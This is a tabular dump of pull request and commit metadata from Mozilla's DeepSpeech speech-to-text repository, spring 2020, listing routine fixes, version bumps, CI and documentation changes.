980,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2998,2998,Improve error handling around Scorer (Fixes #2995 and #2996),,reuben,477142,2020-05-18T15:43:13Z,MEMBER,True,76,65,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7ed900e333680984c9e409980bbcbad94cc6809c,Add better error information in Scorer initialization
981,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2998,2998,Improve error handling around Scorer (Fixes #2995 and #2996),,reuben,477142,2020-05-18T15:43:13Z,MEMBER,True,76,65,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d3d5398d6beecb5bec5c48c9299d990cb6f3ec22,Move error definition and description together
982,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2998,2998,Improve error handling around Scorer (Fixes #2995 and #2996),,reuben,477142,2020-05-18T15:43:13Z,MEMBER,True,76,65,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,afb8c55b6ef3e7f0384180af1acb17ab5a6a2ec1,Basic coverage of DS_ErrorCodeToErrorMessage
983,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2998,2998,Improve error handling around Scorer (Fixes #2995 and #2996),,reuben,477142,2020-05-18T15:43:13Z,MEMBER,True,76,65,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4db20b3cd648bb2d33b18e9a0018b30f724ec4b1,Expose DS error codes in ds_ctcdecoder package
984,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2998,2998,Improve error handling around Scorer (Fixes #2995 and #2996),,reuben,477142,2020-05-18T15:43:13Z,MEMBER,True,76,65,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,361e216297ac0924a6cd02236b62011bdaa4ddeb,Only ignore (expected) missing trie error in generate_package.py
985,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2998,2998,Improve error handling around Scorer (Fixes #2995 and #2996),,reuben,477142,2020-05-18T15:43:13Z,MEMBER,True,76,65,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bfd90f1f9bc18153308ea0c2b4c8fc5085855d56,Include error descriptions in documentation page
986,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2998,2998,Improve error handling around Scorer (Fixes #2995 and #2996),,reuben,477142,2020-05-18T15:43:13Z,MEMBER,True,76,65,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e8647aa5fa0f77fcf1e894381519098035a7c7a1,Add missing import in generate_package.py
987,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2998,2998,Improve error handling around Scorer (Fixes #2995 and #2996),,reuben,477142,2020-05-18T15:43:13Z,MEMBER,True,76,65,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1276c47d8f6da8557041ebdf95c7c0e59ebc16d9,Trigger same error message for all input formats
988,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2998,2998,Improve error handling around Scorer (Fixes #2995 and #2996),,reuben,477142,2020-05-18T15:43:13Z,MEMBER,True,76,65,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a590e3726b2f0d4a5a6b0ea4ca465d26b66fe536,"Add link to RTD, actually exit on error"
989,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2998,2998,Improve error handling around Scorer (Fixes #2995 and #2996),,reuben,477142,2020-05-18T15:43:13Z,MEMBER,True,76,65,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,836707d3abec391104b8f4d3bb2cadce55347e4e,Disable pacman update to workaround zstd package issuee
990,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2994,2994,Bug fix - test_csvs argument was ignored,"Removed spurious overwriting of argument 'test_csvs' in evaluate.py
This bug leads to problems in lm_optimizer.py",Jendker,14967831,2020-05-15T17:00:05Z,CONTRIBUTOR,True,0,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0849261b389be00bd572407e32b60781d7141680,"Bug fix - test_csvs argument was not used

Removed spurious overwriting of argument 'test_csvs' in evaluate.py
This bug lead to problems in lm_optimizer.py"
991,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2990,2990,Bump VERSION to 0.7.1,,reuben,477142,2020-05-12T14:37:10Z,MEMBER,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d1b4ea85388ae699c84127ad3755dcab84d61f7e,Bump VERSION to 0.7.1
992,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2989,2989,remove bad reference to requirements.txt,,JRMeyer,8389864,2020-05-12T01:28:33Z,CONTRIBUTOR,True,0,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,de710ab3d61c9122784c16050cd2ad185f0c2631,remove bad reference to requirements.txt
993,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2984,2984,CV2 importer: train-all.csv,Writes additional `train-all.csv` with all validated samples except speakers and/or transcripts already in dev or test.,tilmankamp,5991088,2020-05-07T13:11:27Z,CONTRIBUTOR,True,54,40,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3871cdc67ffc2aeb90aa48f9f667592fc74631cb,CV2 importer: Writes additional train-all.csv with all validated samples except speakers and/or transcripts already in dev or test
994,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2983,2983,Bump VERSION to 0.7.1-alpha.2,,reuben,477142,2020-05-07T11:13:05Z,MEMBER,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e188e255b00926a9720313a0d948a4f9dae3124e,Bump VERSION to 0.7.1-alpha.2
995,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2982,2982,Run streaming tests in Node TFLite tasks too,,reuben,477142,2020-05-06T11:28:54Z,MEMBER,True,45,8,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3b53f92c0a04a4dcc7a5f30e403b6b1224cbf8f7,Run streaming tests in Node TFLite tasks too
996,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2982,2982,Run streaming tests in Node TFLite tasks too,,reuben,477142,2020-05-06T11:28:54Z,MEMBER,True,45,8,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7394b131412bb1832c9af69443b8d6dfb1b5b361,Handle missing xxd gracefully
997,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2981,2981,PR #2980 + tests (Fixes #2979),,reuben,477142,2020-05-06T10:04:56Z,MEMBER,True,25,7,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,41d990e5383b36ba9a2ce4b867214b5f81c06110,"fix(js): declare FinishStreamWithMetadata result object
- as demanded by strict mode

close #2979"
998,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2981,2981,PR #2980 + tests (Fixes #2979),,reuben,477142,2020-05-06T10:04:56Z,MEMBER,True,25,7,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e6e3cc539b8745ea39040c40e0ba97e6b198accd,Mark aNumResults parameters in *withMetadata methods as optional
999,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2981,2981,PR #2980 + tests (Fixes #2979),,reuben,477142,2020-05-06T10:04:56Z,MEMBER,True,25,7,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b0e0972b78e4e931aa62c4db842a9373c61fd153,Fix reference to Stream.finishStreamWithMetadata
1000,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2981,2981,PR #2980 + tests (Fixes #2979),,reuben,477142,2020-05-06T10:04:56Z,MEMBER,True,25,7,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a02eddec385ab95d8f746ad570a670586e2ad87c,Add JS test for streaming + metadata
1001,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2980,2980,fix(js): declare FinishStreamWithMetadata result object,"- as demanded by strict mode

close #2979",mmccartn,6886499,2020-05-05T21:35:32Z,NONE,False,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,41d990e5383b36ba9a2ce4b867214b5f81c06110,"fix(js): declare FinishStreamWithMetadata result object
- as demanded by strict mode

close #2979"
1002,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2976,2976,Fix beam width setting in python client,"Method name should be `setBeamWidth`, not `setModelBeamWidth`.",lwalejko,8046504,2020-05-05T12:45:39Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d8c3b71033a585641a7a8e8e7712739dcd1d3831,fix beam width setting in python client
1003,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2971,2971,Bump VERSION to 0.7.1-alpha.1,,reuben,477142,2020-05-04T09:42:55Z,MEMBER,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,524f7a76462491067b9d78b3b97fcf120f226406,Bump VERSION to 0.7.1-alpha.1
1004,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2970,2970,Improve error handling for DS_EnableExternalScorer (Fixes #2969),,reuben,477142,2020-05-03T13:50:05Z,MEMBER,True,14,9,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5deb8a2f7b3c5535b2574ea4fa7aba3a909e4a09,Don't leave partially initialized scorer on failure
1005,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2970,2970,Improve error handling for DS_EnableExternalScorer (Fixes #2969),,reuben,477142,2020-05-03T13:50:05Z,MEMBER,True,14,9,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,48971413e524280f2b677013ae05389dc2115934,Improve EnableExternalScorer error handling in Python and JS bindings
1006,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2966,2966,Update TRAINING.rst,Based on reply to #2965 I suggest adding following sentence to the docs,lwalejko,8046504,2020-04-30T13:27:22Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ae2d3754e6d037b726319c2a8a3cd2198e03abe0,Update TRAINING.rst
1007,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2964,2964,Add --candidate_transcripts flag to Python client,,reuben,477142,2020-04-30T08:09:55Z,MEMBER,True,4,2,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e0283f529add61dd35f37270e36c5022f812516e,Add --candidate_transcripts flag to Python client
1008,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2964,2964,Add --candidate_transcripts flag to Python client,,reuben,477142,2020-04-30T08:09:55Z,MEMBER,True,4,2,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,efd536bfa34c3006ad797ce473850c958286d9df,Retry tasks on TaskCluster
1009,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2964,2964,Add --candidate_transcripts flag to Python client,,reuben,477142,2020-04-30T08:09:55Z,MEMBER,True,4,2,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c324e4c8c26e9c67eda52e85fec11e1fb51fe20e,Retry one more time
1010,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2960,2960,Bump VERSION to 0.7.1-alpha.0,,reuben,477142,2020-04-29T16:19:26Z,MEMBER,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8240666bb30ff98c787d1121ff674343daf80b05,Bump VERSION to 0.7.1-alpha.0
1011,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2959,2959,Don't escape non-ASCII chars in test_output_file JSON & other small fixes,,reuben,477142,2020-04-29T13:45:39Z,MEMBER,True,20,10,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b283aadae6d1907d93a4bc5cb072ed97de4e6c06,Don't escape non-ASCII characters in test_output_file
1012,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2959,2959,Don't escape non-ASCII chars in test_output_file JSON & other small fixes,,reuben,477142,2020-04-29T13:45:39Z,MEMBER,True,20,10,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,aa143e1b9e008d3ad4196f60eb6136e6f1327479,Add missing log_warn import
1013,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2959,2959,Don't escape non-ASCII chars in test_output_file JSON & other small fixes,,reuben,477142,2020-04-29T13:45:39Z,MEMBER,True,20,10,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6eb784bd3eab7c15d535190e0c859c340811dc9c,"Make DeepSpeech.py executable and call Python interpreter explicitly in docs

X-DeepSpeech: NOBUILD"
1014,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2958,2958,Add Node.JS v14 support,,reuben,477142,2020-04-29T12:16:23Z,MEMBER,False,660,5,48,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8016b333a6420a72c16d9b5367ae4515f7f9da36,Add Node.JS v14 support
1015,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2957,2957,"Return Stream wrapper in JS Model.createStream, add test coverage (Fixes #2956)",,reuben,477142,2020-04-29T11:50:23Z,MEMBER,True,66,32,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b0415af4b415bfbacab9af13de4dcd7af1ae7bb6,Return Stream wrapper in JS Model.createStream
1016,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2957,2957,"Return Stream wrapper in JS Model.createStream, add test coverage (Fixes #2956)",,reuben,477142,2020-04-29T11:50:23Z,MEMBER,True,66,32,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,be1bd04b507ed778cc1dec28bd4436469c3538a7,Add streaming mode to JS client
1017,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2957,2957,"Return Stream wrapper in JS Model.createStream, add test coverage (Fixes #2956)",,reuben,477142,2020-04-29T11:50:23Z,MEMBER,True,66,32,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6f83e05341b1ab858dc9dd4b59a259b858d25036,Test JS client streaming mode
1018,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2954,2954,Python TFLite tests,,lissyx,1645737,2020-04-28T17:16:47Z,COLLABORATOR,True,317,7,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ecdcf9e28a193aa2eff4b34b3354db8d97e2d388,Python TFLite tests
1019,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2952,2952,Use TensorFlow r2.2 in native client,,lissyx,1645737,2020-04-28T16:06:35Z,COLLABORATOR,True,130,190,82,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,41d7b4e6f053306c13e94e6d306a964bce6da16e,Use TensorFlow r2.2 artifacts
1020,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2952,2952,Use TensorFlow r2.2 in native client,,lissyx,1645737,2020-04-28T16:06:35Z,COLLABORATOR,True,130,190,82,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bc086ec998d34adcb7d480b3bc9a0919312e3916,Build DeepSpeech using TensorFlow r2.2
1021,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2952,2952,Use TensorFlow r2.2 in native client,,lissyx,1645737,2020-04-28T16:06:35Z,COLLABORATOR,True,130,190,82,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4a174f6adc5bcd621b13ec709cfb2fd8672f0dca,Remove libssl 1.0.2 hack
1022,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2952,2952,Use TensorFlow r2.2 in native client,,lissyx,1645737,2020-04-28T16:06:35Z,COLLABORATOR,True,130,190,82,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f169e8f92197ce3dee4c5c6b92b58f840ee87ea3,Linux cleanup
1023,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2952,2952,Use TensorFlow r2.2 in native client,,lissyx,1645737,2020-04-28T16:06:35Z,COLLABORATOR,True,130,190,82,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,eca69d1c84194c83aef36368d11937d570796f46,Trusty -> Xenial
1024,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2951,2951,"Ugly, very ugly, incredibly ugly static linking of libsox on macOS","All of the brew installed dependencies have static libraries as well, but the macOS linker will always prefer a dynamic library if both exist under the same `-L/foo -lbar` resolution. The only way to force static linking is to include a full path to the static library. These changes basically reverse engineer the static library locations and then pass those to the linker.",reuben,477142,2020-04-28T10:57:37Z,MEMBER,True,10,5,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ea7475d09c65d6682f4f20edcf62ec8198335c33,"Ugly, very ugly, incredibly ugly static linking of libsox on macOS

All of the brew installed dependencies have static libraries as well, but the macOS linker will always prefer a dynamic library if both exist under the same `-L/foo -lbar` resolution. The only way to force static linking is to include a full path to the static library. These changes basically reverse engineer the static library locations and then pass those to the linker."
1025,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2949,2949,Docs centered on ReadTheDocs instead of GitHub,,reuben,477142,2020-04-27T16:53:25Z,MEMBER,True,103,104,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a584c8e6b6a4f231d6ce37be61c23c9802417f10,Docs centered on ReadTheDocs instead of GitHub
1026,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2949,2949,Docs centered on ReadTheDocs instead of GitHub,,reuben,477142,2020-04-27T16:53:25Z,MEMBER,True,103,104,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1838a1e0d49f796d88140a0582298e2601c74b2e,Remove FAQ reference and reword SUPPORT.rst a bit
1027,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2949,2949,Docs centered on ReadTheDocs instead of GitHub,,reuben,477142,2020-04-27T16:53:25Z,MEMBER,True,103,104,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d85b0960eb645f287d961f8d0acfd0298e035839,Address review comment
1028,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2949,2949,Docs centered on ReadTheDocs instead of GitHub,,reuben,477142,2020-04-27T16:53:25Z,MEMBER,True,103,104,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6f9fcf302905d3e43872de4a419cbb3233806f23,Embed flag definitions
1029,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2946,2946,Install deepspeech header,Useful for c++ dev,jschueller,3832365,2020-04-26T07:19:16Z,CONTRIBUTOR,True,2,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1eed145aa131f98ab40c1d545e715c0fae2047d8,Install deepspeech header
1030,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2945,2945,fix building ARPA file (building_lm using kenlm),"Error message is:
```
kenlm/lm/builder/adjust_counts.cc:60 in void lm::builder::{anonymous}::StatCollector::CalculateDiscounts(const lm::builder::DiscountConfig&) threw BadDiscountException because `discounts_[i].amount[j] < 0.0 || discounts_[i].amount[j] > j'.
ERROR: 1-gram discount out of range for adjusted count 3: -0.20000005
```
This fix is given in kenlm issue tracker, when small dataset are used.",d-a-v,4800356,2020-04-25T16:03:51Z,CONTRIBUTOR,True,10,3,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8cdbff4ed374c42dc71eadd825ccdbe40c654c4f,"fix building ARPA file (building_lm using kenlm)

Error message is:
kenlm/lm/builder/adjust_counts.cc:60 in void lm::builder::{anonymous}::StatCollector::CalculateDiscounts(const lm::builder::DiscountConfig&) threw BadDiscountException because `discounts_[i].amount[j] < 0.0 || discounts_[i].amount[j] > j'.
ERROR: 1-gram discount out of range for adjusted count 3: -0.20000005

This fix is given in kenlm issue tracker, when small dataset are used."
1031,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2945,2945,fix building ARPA file (building_lm using kenlm),"Error message is:
```
kenlm/lm/builder/adjust_counts.cc:60 in void lm::builder::{anonymous}::StatCollector::CalculateDiscounts(const lm::builder::DiscountConfig&) threw BadDiscountException because `discounts_[i].amount[j] < 0.0 || discounts_[i].amount[j] > j'.
ERROR: 1-gram discount out of range for adjusted count 3: -0.20000005
```
This fix is given in kenlm issue tracker, when small dataset are used.",d-a-v,4800356,2020-04-25T16:03:51Z,CONTRIBUTOR,True,10,3,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,62018bf0b2d23446479e6b73fe84c111dc508957,"make ""--discount_fallback"" optional"
1032,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2945,2945,fix building ARPA file (building_lm using kenlm),"Error message is:
```
kenlm/lm/builder/adjust_counts.cc:60 in void lm::builder::{anonymous}::StatCollector::CalculateDiscounts(const lm::builder::DiscountConfig&) threw BadDiscountException because `discounts_[i].amount[j] < 0.0 || discounts_[i].amount[j] > j'.
ERROR: 1-gram discount out of range for adjusted count 3: -0.20000005
```
This fix is given in kenlm issue tracker, when small dataset are used.",d-a-v,4800356,2020-04-25T16:03:51Z,CONTRIBUTOR,True,10,3,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,90a0aac0208b1d92634ca26eb6531238aaba6260,give CI a beer
1033,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2944,2944,Doc: Mention we explicitely need Bazel 0.24.1,ref https://github.com/mozilla/DeepSpeech/issues/2943,jschueller,3832365,2020-04-25T12:15:30Z,CONTRIBUTOR,True,1,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1a6fabf3465da8d140879b3a7b00f71353911af4,"Doc: Mention we explicitely need Bazel 0.24.1

ref https://github.com/mozilla/DeepSpeech/issues/2943"
1034,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2939,2939,Bump VERSION to 0.7.0 and update docs,,reuben,477142,2020-04-24T14:53:51Z,MEMBER,True,15,15,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b25404e2943d4c251b538e6a071be3b5843d5c46,Bump VERSION to 0.7.0 and update docs
1035,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2938,2938,Bump VERSION to 0.7.0-alpha.4,,reuben,477142,2020-04-24T11:21:33Z,MEMBER,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,43a85518d26320e40498c1c5c9f93d47c92ac811,Bump VERSION to 0.7.0-alpha.4
1036,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2936,2936,Update prod model,,reuben,477142,2020-04-23T19:47:01Z,MEMBER,True,20,32,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3353f6a60ae5788fc9397c5d7065bfa272503bbf,Update prod model
1037,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2936,2936,Update prod model,,reuben,477142,2020-04-23T19:47:01Z,MEMBER,True,20,32,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ff8570c1f3c2182b98c9284a9870e42ca455a2bc,Update prod model expected inference results
1038,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2935,2935,Update import_swc.py,"I tried to use the importer. With the Error path not defined.

I think it's appear after the refactor by @reuben.
Nothing big, but I think an commit worth. :)",GoldschmittGabriel,58830501,2020-04-23T12:46:21Z,CONTRIBUTOR,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3daca6f209a2bf967b3438e444dcfdd76eceeecd,"Update import_swc.py 

I tried to use the importer. With the Error path not defined.

I think it's appear after the refactor by @reuben.
Nothing big, but I think an commit worth. :)"
1039,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2934,2934,Unpin numpy version in training package,,reuben,477142,2020-04-23T09:00:48Z,MEMBER,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,301def71e06b03da5d26a2bc95ed5ab8e3d9dc15,Unpin numpy in training package
1040,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2933,2933,Updated alpha and beta,,kdavis-mozilla,12054740,2020-04-23T08:22:17Z,CONTRIBUTOR,True,5,5,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f3b4943e18dbaecfa347e9f69a0bce59390276c1,Updated alpha and beta
1041,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2932,2932,Maximal numpy dependency set to setup.py's version,Fixed issue #2931 ,kdavis-mozilla,12054740,2020-04-22T19:15:42Z,CONTRIBUTOR,False,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,318f1ab1b6aac1fea193d65fe2ef8b9ad9f607de,Maximal numpy dependency set to setup.py's version
1042,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2929,2929,Fix #2928: Add Python 3.7 CI coverage,,lissyx,1645737,2020-04-20T14:23:17Z,COLLABORATOR,True,24,0,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a48341f57fd73609218ad56caf24813fdb5d2557,"Fix #2928: Add Python 3.7, 3.8 CI coverage"
1043,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2927,2927,Do not use m/mu ABI for Py3.8+,,lissyx,1645737,2020-04-20T14:04:10Z,COLLABORATOR,True,4,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,08ff548d265158a5c65a3f06f10b6196873ca442,Do not use m/mu ABI for Py3.8+
